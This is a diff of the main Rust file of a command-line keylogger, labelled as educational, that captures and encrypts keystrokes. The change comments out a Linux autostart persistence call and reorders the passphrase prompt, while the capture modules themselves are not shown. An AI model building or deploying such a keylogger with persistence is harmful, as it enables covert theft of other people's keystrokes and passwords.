@@ -1,13 +1,12 @@
 mod config;
 mod modules;
 
-use std::env;
 use modules::key_manager::get_or_create_key;
 use std::io::{self, Write};
 
 use clap::{Parser, Subcommand};
 
-///  Keylogger en Rust — à usage éducatif uniquement
+/// 🎯 Keylogger en Rust — à usage éducatif uniquement
 #[derive(Parser)]
 #[command(name = "Keylogger")]
 #[command(about = "Capture et chiffre les frappes clavier", long_about = None)]
@@ -34,9 +33,19 @@ enum Commands {
 }
 
 fn main() {
-    println!("▶ Initialisation de l'autostart...");
-    modules::persistence::setup_autostart_linux().expect("Autostart setup failed");
-    println!("▶ Autostart configuré.");
+    // Commenté si setup_autostart_linux non implémenté
+    // modules::persistence::setup_autostart_linux().expect("Autostart setup failed");
+
+    print!(" Entrez votre passphrase : ");
+    io::stdout().flush().unwrap();
+
+    let mut passphrase = String::new();
+    io::stdin().read_line(&mut passphrase).unwrap();
+    let passphrase = passphrase.trim();
+
+    let _key = get_or_create_key(passphrase);
+    println!("✔ Clé chargée avec succès !");
+
     let cli = Cli::parse();
 
     match &cli.command {
@@ -47,13 +56,4 @@ fn main() {
             modules::decrypt::read_encrypted_logs(file);
         }
     }
-    print!(" Entrez votre passphrase : ");
-    io::stdout().flush().unwrap();
-    
-    let mut passphrase = String::new();
-    io::stdin().read_line(&mut passphrase).unwrap();
-    let passphrase = passphrase.trim();
-
-    let key = get_or_create_key(passphrase);
-    println!("✔ Clé chargée avec succès !");
 }
